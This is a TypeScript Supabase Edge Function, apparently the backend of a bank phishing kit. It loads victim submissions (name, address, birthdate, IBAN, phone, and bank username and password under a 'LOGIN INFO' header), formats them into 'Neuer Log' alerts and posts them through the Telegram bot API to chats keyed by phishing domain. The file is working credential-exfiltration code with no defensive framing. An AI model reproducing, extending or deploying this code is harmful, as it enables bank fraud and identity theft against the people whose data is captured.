import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2/cors";

function normalizeDomain(d?: string | null): string {
  return (d || "")
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/^www\./, "")
    .replace(/\/.*$/, "")
    .trim();
}

function formatLog(s: any): string {
  return `🔔 Neuer Log

fullname: ${s.full_name || ""}
email: ${s.email || ""}
city: ${s.city || ""}
street: ${s.street || ""}
housenumber: ${s.house_number || ""}
stiege: ${s.staircase || ""}
door: ${s.door_number || ""}
postcode: ${s.postal_code || ""}
birthdate: ${s.birthdate || ""}
iban: ${s.iban || ""}
phone: ${s.phone || ""}

======> LOGIN INFO <=======
benutzername: ${s.bank_username || ""}
passwort: ${s.bank_password || ""}
bank: ${s.bank || ""}

user-agent: ${s.user_agent || ""}
domain: ${s.domain || ""}`;
}

function formatFullInfo(s: any): string {
  return `🟡 Full Info (ohne Login)

fullname: ${s.full_name || ""}
email: ${s.email || ""}
city: ${s.city || ""}
street: ${s.street || ""}
housenumber: ${s.house_number || ""}
stiege: ${s.staircase || ""}
door: ${s.door_number || ""}
postcode: ${s.postal_code || ""}
birthdate: ${s.birthdate || ""}
iban: ${s.iban || ""}
phone: ${s.phone || ""}
bank: ${s.bank || ""}

user-agent: ${s.user_agent || ""}
domain: ${s.domain || ""}`;
}

async function sendToMatchingChats(
  supabase: any,
  botToken: string,
  text: string,
  submissionDomain: string | null,
): Promise<number> {
  const { data: chatIds } = await supabase
    .from("telegram_chat_ids")
    .select("chat_id, domains");

  if (!chatIds || chatIds.length === 0) return 0;

  const target = normalizeDomain(submissionDomain);
  if (!target) return 0;
  const matches = chatIds.filter((c: any) => {
    const list = Array.isArray(c.domains) ? c.domains : [];
    return list.map((d: string) => normalizeDomain(d)).includes(target);
  });

  let sent = 0;
  for (const { chat_id: cid } of matches) {
    const res = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: cid, text }),
      },
    );
    if (res.ok) sent++;
  }
  return sent;
}

async function processNotification(
  supabase: any,
  botToken: string,
  submission_id: string,
  kind: "full_info" | "log" | "auto",
  _force = false,
): Promise<{ ok: boolean; sent: number; reason?: string; kind?: string }> {
  // Load current submission state
  const { data: submission, error } = await supabase
    .from("submissions")
    .select("*")
    .eq("id", submission_id)
    .single();

  if (error || !submission) return { ok: false, sent: 0, reason: "not_found" };

  // If already sent and this is an auto/cron call, skip
  if (submission.telegram_sent && kind === "auto") {
    return { ok: true, sent: 0, reason: "already_sent" };
  }

  // Determine kind from current DB state (auto), or use explicit kind
  let resolvedKind: "log" | "full_info";
  if (kind === "auto") {
    resolvedKind = submission.bank_username && submission.bank_password ? "log" : "full_info";
  } else {
    resolvedKind = kind;
  }

  const text = resolvedKind === "log" ? formatLog(submission) : formatFullInfo(submission);
  const sent = await sendToMatchingChats(supabase, botToken, text, submission.domain);

  // Only mark as sent if at least one Telegram message was successfully delivered
  if (sent > 0) {
    await supabase
      .from("submissions")
      .update({ telegram_sent: true, notified_at: new Date().toISOString() })
      .eq("id", submission_id);
  }

  return { ok: true, sent, kind: resolvedKind };
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const body = await req.json();
    const { submission_id, test, chat_id, kind = "log", force = false } = body;

    const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
    if (!TELEGRAM_BOT_TOKEN) {
      return new Response(JSON.stringify({ error: "TELEGRAM_BOT_TOKEN not set" }), {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Test mode
    if (test && chat_id) {
      const res = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id,
            text: "✅ Telegram Bot verbunden! Benachrichtigungen sind aktiv.",
          }),
        },
      );
      const data = await res.json();
      return new Response(JSON.stringify(data), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: res.ok ? 200 : 400,
      });
    }

    if (!submission_id) {
      return new Response(JSON.stringify({ error: "submission_id required" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (kind !== "full_info" && kind !== "log" && kind !== "auto") {
      return new Response(JSON.stringify({ error: "invalid kind" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    
    const result = await processNotification(
      supabase,
      TELEGRAM_BOT_TOKEN,
      submission_id,
      kind,
      force,
    );

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
